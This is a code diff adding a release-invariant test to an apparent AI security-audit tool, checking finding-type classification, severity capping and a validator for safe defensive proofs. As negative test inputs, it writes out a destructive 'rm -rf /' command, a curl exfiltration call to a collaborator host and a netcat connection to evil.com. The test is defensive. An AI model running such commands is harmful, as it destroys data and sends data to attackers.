@@ -26,7 +26,12 @@ import {
   validateFindingLineage,
   computeFindingFingerprint,
   calculateEvidenceSufficiency,
-  deriveAuthoritativeEvidenceSufficiency
+  deriveAuthoritativeEvidenceSufficiency,
+  validateFindingType,
+  VALID_FINDING_TYPES,
+  validateSafeProof,
+  VALID_PROOF_KINDS,
+  validateCanonicalFindings
 } from './finalize-scan.mjs';
 import { verifyRemediation } from './validate-patch.mjs';
 import { buildDirectoryManifest, classifyFile, categorizeDirectory } from './build-inventory.mjs';
@@ -66,6 +71,7 @@ const REQUIRED_FILES = [
   'skills/security-audit/references/threat-modeling.md',
   'skills/security-audit/references/verifier-protocol.md',
   'skills/security-audit/references/finding-lineage.md',
+  'skills/security-audit/references/safe-proof-policy.md',
   'agents/threat-modeler.md',
   'agents/discovery-agent.md',
   'agents/verifier-reachability.md',
@@ -849,6 +855,63 @@ export function checkReleaseInvariants(repoRoot = process.cwd()) {
           }
         } finally {
           fs.rmSync(synDir, { recursive: true, force: true });
+        }
+      }
+    },
+    {
+      id: 'SEC-INV-21',
+      name: 'Finding Type & Safe Defensive Proof Policy Invariant',
+      check: () => {
+        // 1. validateFindingType separates vulnerabilities from hardening and informational
+        const v = validateFindingType('VULNERABILITY');
+        const h = validateFindingType('HARDENING');
+        const i = validateFindingType('INFORMATIONAL');
+        const d = validateFindingType('UNSPECIFIED', 'CWE-hardening', 'Stricter CSP config');
+        const infoExposure = validateFindingType(null, 'CWE-200', 'Sensitive Information Disclosure in API');
+        if (!v.valid || !h.valid || !i.valid || d.findingType !== 'HARDENING' || infoExposure.findingType !== 'VULNERABILITY') {
+          throw new Error('validateFindingType failed to validate or infer finding types or misclassified information disclosure');
+        }
+
+        // 2. Hardening cannot masquerade as CRITICAL / HIGH vulnerability
+        const testHardening = {
+          id: 'SEC-TEST-H',
+          ruleId: 'SEC-HARD',
+          title: 'Hardening Title',
+          findingType: 'HARDENING',
+          severity: 'CRITICAL',
+          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 }
+        };
+        const validatedH = validateCanonicalFindings([testHardening], repoRoot);
+        if (validatedH[0].severity !== 'LOW') {
+          throw new Error(`Hardening finding was not capped to LOW severity: got ${validatedH[0].severity}`);
+        }
+
+        // 3. validateSafeProof blocks prohibited proof patterns (destructive commands, live exploits, exfil, netcat)
+        const safeProof = validateSafeProof('Source-to-sink dataflow trace', 'STATIC_TRACE');
+        const badCmd = validateSafeProof('rm -rf / --no-preserve-root', 'UNIT_TEST');
+        const badExfil = validateSafeProof('curl https://burpcollaborator.net/leak', 'STATIC_TRACE');
+        const badNetcat = validateSafeProof('nc evil.com 4444', 'STATIC_TRACE');
+        const badExploit = validateSafeProof('LIVE_EXPLOIT executed against production', 'STATIC_TRACE');
+        if (!safeProof.valid || badCmd.valid || badExfil.valid || badNetcat.valid || badExploit.valid) {
+          throw new Error('validateSafeProof failed to block prohibited offensive exploit, destructive command, or netcat');
+        }
+
+        // 4. Prohibited proof in candidate (including attackPath) downgrades to DEFERRED fail-closed
+        const badCandidate = {
+          id: 'SEC-TEST-BAD-POC',
+          ruleId: 'CWE-78',
+          title: 'Command Injection',
+          proof: 'benign trace',
+          attackPath: { steps: [], proofOfConcept: 'rm -rf / --no-preserve-root' },
+          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 },
+          disposition: 'REPORTABLE',
+          verdict: 'CONFIRMED',
+          consensus: { supports: 3, totalVotes: 3 },
+          rigor: { score: 0.9 }
+        };
+        const validatedBad = validateCanonicalFindings([badCandidate], repoRoot);
+        if (validatedBad[0].disposition !== 'DEFERRED' || !validatedBad[0].dispositionReason.includes('PROHIBITED_PROOF_VIOLATION')) {
+          throw new Error('Candidate with prohibited proof pattern was not downgraded to DEFERRED fail-closed');
         }
       }
     }
